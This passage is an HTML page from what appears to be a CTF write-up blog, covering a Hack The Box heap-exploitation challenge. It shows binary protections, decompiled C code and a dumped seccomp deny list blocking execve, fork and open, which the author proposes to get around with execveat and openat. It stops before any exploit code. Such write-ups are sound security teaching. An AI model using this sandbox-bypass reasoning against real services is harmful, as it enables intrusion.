@@ -1,0 +1,780 @@
+<!doctype html><html lang="es"><head><title>Dream Diary: Chapter 3 | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="64-bit binary. Heap exploitation. Null byte poisoning. Overlapping chunks. Tcache poisoning. ROP chain. `seccomp` rules"><meta itemprop="description" content="64-bit binary. Heap exploitation. Null byte poisoning. Overlapping chunks. Tcache poisoning. ROP chain. `seccomp` rules"><meta name="twitter:card" content="64-bit binary. Heap exploitation. Null byte poisoning. Overlapping chunks. Tcache poisoning. ROP chain. `seccomp` rules"><meta name="twitter:description" content="64-bit binary. Heap exploitation. Null byte poisoning. Overlapping chunks. Tcache poisoning. ROP chain. `seccomp` rules"><meta property="og:description" content="64-bit binary. Heap exploitation. Null byte poisoning. Overlapping chunks. Tcache poisoning. ROP chain. `seccomp` rules"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Dream Diary: Chapter 3"><meta property="twitter:title" content="Dream Diary: Chapter 3"><meta property="og:title" content="Dream Diary: Chapter 3"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/dream-diary-chapter-3/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/&amp;text=Dream%20Diary:%20Chapter%203" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/&amp;title=Dream%20Diary:%20Chapter%203" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Dream Diary: Chapter 3</h1><p class="mb4 f6 dib tracked">25 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#seccomp-rules"><code>seccomp</code> rules</a></li><li><a href="#program-options">Program options</a></li><li><a href="#allocation-function">Allocation function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#null-byte-poisoning">Null byte poisoning</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>diary3</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'./'
+</code></pre></div><p>Moreover, we also have the remote Glibc library and loader:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./ld-2.29.so</span> <span class="mtku">libc.so.6</span>
+GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.  
+Copyright (C) 2020 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 9.4.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+</code></pre></div><p>The binary is already patched to used these files, so no actions needed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">diary3</span>
+        linux-vdso.so.1 (0x00007ffce37e2000)
+        libc.so.6 =&gt; ./libc.so.6 (0x00007fc0db710000)
+        ./ld-2.29.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fc0db904000)  
+</code></pre></div><p>Further, there is a note:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">note.txt</span>
+apparently, my friend told me that having /bin/sh in libc isn't safe... so I patched it up :p  
+</code></pre></div><p>So, the typical <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> approach does not seem useful this time&mldr;</p><h2 id="reverse-engineering">Reverse engineering</h2><p>Let&rsquo;s open the binary in Ghidra to analyze the decompiled C code. This is <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
+<span class="mtk1">  undefined4 option;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
+
+<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, exit_troll);</span>
+<span class="mtk1">  </span><span class="mtk8">alarm</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">78</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome to Dream Diary: Chapter 3!  The return of</span><span class="mtk4"> a Dream Diary with modern protections!"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"1. write about dream </span><span class="mtk6">\n</span><span class="mtk4">2. edit dream</span><span class="mtk6">\n</span><span class="mtk4">3. delete dream</span><span class="mtk6">\n</span><span class="mtk4">4. recount dream</span><span class="mtk6">\n</span><span class="mtk4">5. exit diary</span><span class="mtk6">\n</span><span class="mtk4"> "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">53</span><span class="mtk1">, stderr);</span>  
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>
+
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (option) {</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid choice</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">f</span><span class="mtk1">, stderr);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">write_dreams</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">edit_dream</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
+<span class="mtk1">      i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">100000</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>It is calling <code>setup</code> at first:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">setup</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">26</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Could not start seccomp"</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">16</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_001040a0);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Could not start seccomp"</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><h3 id="seccomp-rules"><code>seccomp</code> rules</h3><p>It is configuring <code>seccomp</code>, so let&rsquo;s use <a href="https://github.com/david942j/seccomp-tools"><code>seccomp-tools</code></a> to dump the filters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">seccomp-tools</span> dump <span class="mtku">./diary3</span>
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == <span class="rb-cream">ARCH_X86_64</span>) goto 0003  
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x00000039  if (A != <span class="rb-green">fork</span>) goto 0006
+ 0005: 0x06 0x00 0x00 0x00000000  return KILL
+ 0006: 0x15 0x00 0x01 0x0000003b  if (A != <span class="rb-green">execve</span>) goto 0008
+ 0007: 0x06 0x00 0x00 0x00000000  return KILL
+ 0008: 0x15 0x00 0x01 0x0000003a  if (A != <span class="rb-green">vfork</span>) goto 0010
+ 0009: 0x06 0x00 0x00 0x00000000  return KILL
+ 0010: 0x15 0x00 0x01 0x00000002  if (A != <span class="rb-green">open</span>) goto 0012
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+ 0012: 0x15 0x00 0x01 0x00000055  if (A != <span class="rb-green">creat</span>) goto 0014
+ 0013: 0x06 0x00 0x00 0x00000000  return KILL
+ 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+</code></pre></div><p>As can be seen, we cannot use <code>sys_execve</code>, which is a <code>syscall</code> used by functions like <code>system</code> to run commands. Moreover, we cannot use <code>sys_open</code> to open a file from the server. However, notice that this is a blacklist approach, so there are a lot of <code>syscall</code> instruction we can still use. Looking at <a href="https://x64.syscall.sh/">x64.syscall.sh</a>, we can find some usefull <code>syscall</code> instructions such as <code>sys_execveat</code> or <code>openat</code>, which are very similar to the forbidden ones. Therefore, <code>seccomp</code> rules won&rsquo;t be a problem presumably.</p><p>There are other ways to bypass <code>seccomp</code> rules, but they didn&rsquo;t work in this challenge (more information <a href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">here</a>).</p><h3 id="program-options">Program options</h3><p>The challenge is related to the heap and we have these options:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./diary3</span>
+Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!  
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt;
+</code></pre></div><h3 id="allocation-function">Allocation function</h3><p>This is <code>write_dreams</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">write_dreams</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_dream;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index_copy;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
+<span class="mtk1">  ulong size;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  index_copy </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">18</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index_copy) {</span>
+<span class="mtk1">LAB_001014a3:</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">18</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"no more pages for dreams :(</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1c</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"size: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">        </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">size);</span>
+
